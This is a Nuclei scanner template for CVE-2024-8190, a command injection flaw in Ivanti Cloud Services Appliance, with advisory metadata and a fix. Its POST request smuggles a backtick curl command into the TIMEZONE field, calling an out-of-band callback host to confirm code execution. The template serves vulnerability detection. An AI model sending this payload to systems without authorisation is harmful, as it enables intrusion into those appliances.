id: CVE-2024-8190

info:
  name: Ivanti Cloud Services Appliance OS Command Injection Vulnerability
  author: CodeStuffBreakThings
  severity: high
  description: An OS command injection vulnerability in Ivanti Cloud Services Appliance versions 4.6 Patch 518 and before allows a remote authenticated attacker to obtain remote code execution. The attacker must have admin level privileges to exploit this vulnerability.
  remediation: Update CSA 4.6 to patch 519 or upgrade to CSA 5.0
  reference:
    - https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Cloud-Service-Appliance-CSA-CVE-2024-8190
    - https://www.horizon3.ai/attack-research/cisa-kev-cve-2024-8190-ivanti-csa-command-injection
    - https://github.com/horizon3ai/CVE-2024-8190
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.2
    cve-id: CVE-2024-8190
    cwe-id: CWE-78
  tags: cve2024,cve,ivanti,csa,rce,oast,authenticated

http:
  - method: GET
    path:
      - "{{BaseURL}}/gsb/datetime.php"

    extractors:
      - type: regex
        name: csrf_token
        group: 1
        part: body
        regex:
          - .*name=[\'\"]LDCSA_CSRF[\'\"]\s+value=[\'\"]([^\'\"]+)[\'\"].*
        internal: true

  - method: POST
    path:
      - "{{BaseURL}}/gsb/datetime.php"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    body: "dateTimeFormSubmitted=1&TIMEZONE=%3B+%60curl+{{interactsh-url}}%60+%3B&CYEAR=2024&CMONTH=9&CDAY=13&CHOUR=12&CMIN=34&LDCSA_CSRF={{csrf_token}}&SUBMIT_TIME=Save"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
